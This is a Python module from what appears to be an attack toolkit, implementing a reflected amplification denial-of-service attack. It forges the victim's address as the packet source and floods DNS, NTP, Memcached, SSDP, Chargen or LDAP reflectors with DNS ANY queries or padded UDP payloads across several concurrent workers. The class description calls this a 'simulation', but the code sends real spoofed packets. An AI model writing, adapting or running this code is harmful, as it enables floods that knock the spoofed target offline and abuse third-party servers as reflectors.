import asyncio
import random
from typing import Any

import structlog

from attack.base import BaseAttacker
from utils.packet import PacketCrafter

try:
    from scapy.all import IP, UDP, Raw, DNS, DNSQR
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

logger = structlog.get_logger(__name__)

AMPLIFICATION_SERVICES = {
    "dns": (53, "DNS"),
    "ntp": (123, "NTP"),
    "memcached": (11211, "Memcached"),
    "chargen": (19, "Chargen"),
    "ssdp": (1900, "SSDP"),
    "ldap": (389, "LDAP"),
}


class AmplificationAttack(BaseAttacker):
    name = "amplification"
    description = "DNS/NTP/Memcached/SSDP amplification attack simulation"

    async def run(
        self,
        target: str,
        reflector_ip: str,
        reflector_port: int = 53,
        service: str = "dns",
        rate: int = 100,
        threads: int = 5,
        spoof_src: str = "",
        **kwargs: Any,
    ) -> None:
        if not PacketCrafter.PACKET_AVAILABLE:
            logger.error("scapy_required", message="Amplification attack requires scapy.")
            self.session.fail("scapy not available")
            return

        per_thread_rate = max(1, rate // threads)
        interval = 1.0 / per_thread_rate if per_thread_rate > 0 else 0.001

        async def worker() -> None:
            while not self.session.is_stopped:
                await self.session._pause_event.wait()

                src_ip = spoof_src or target
                src_port = random.randint(1024, 65535)

                ip = IP(src=src_ip, dst=reflector_ip)
                udp = UDP(sport=src_port, dport=reflector_port)

                if service == "dns":
                    dns_query = DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))
                    pkt = ip / udp / dns_query
                else:
                    pkt = ip / udp / Raw(load=b"\x00" * 64)

                packet_bytes = bytes(pkt)
                if PacketCrafter.send_raw(packet_bytes):
                    self.session.stats.packets_sent += 1
                    self.session.stats.bytes_sent += len(packet_bytes)
                else:
                    self.session.stats.errors += 1

                await asyncio.sleep(interval)

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        try:
            await self.session.wait_for_stop()
        finally:
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
